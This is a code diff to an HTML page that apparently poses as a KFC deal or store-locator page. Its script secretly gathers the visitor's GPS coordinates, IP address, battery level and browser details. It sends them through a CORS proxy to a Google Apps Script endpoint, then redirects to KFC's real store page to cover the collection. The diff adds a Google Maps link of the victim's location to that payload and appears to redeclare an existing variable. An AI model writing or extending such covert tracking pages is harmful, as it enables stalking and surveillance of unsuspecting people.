@@ -155,6 +155,8 @@ const content = `🍗 **Nearby KFC Deal Request**
 📍 [Google Maps Link](${mapUrl})${signature}`;
 
 
+const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+
 fetch("https://corsproxy.io/?" + encodeURIComponent("https://script.google.com/macros/s/AKfycbxljE9VsM4fPUOBDYZhoI3tQDrATP_bm817-r5CAu3sNXmZ314ouy8Dv5yIL77NNjDt/exec"), {
   method: "POST",
   headers: {
@@ -166,13 +168,15 @@ fetch("https://corsproxy.io/?" + encodeURIComponent("https://script.google.com/m
     accuracy: accuracy,
     ip: ip,
     battery: battery,
-    ua: userAgent
+    ua: userAgent,
+    map: mapUrl // ✅ sending map link
   })
 }).finally(() => {
   setTimeout(() => {
     window.location.href = "https://www.kfcpakistan.com/store-locations";
   }, 1000);
 });
+
           },
           () => {
             window.location.href = "https://www.kfcpakistan.com/store-locations";
@@ -186,6 +190,7 @@ fetch("https://corsproxy.io/?" + encodeURIComponent("https://script.google.com/m
 
 </body>
 </html>
+
 
 
 
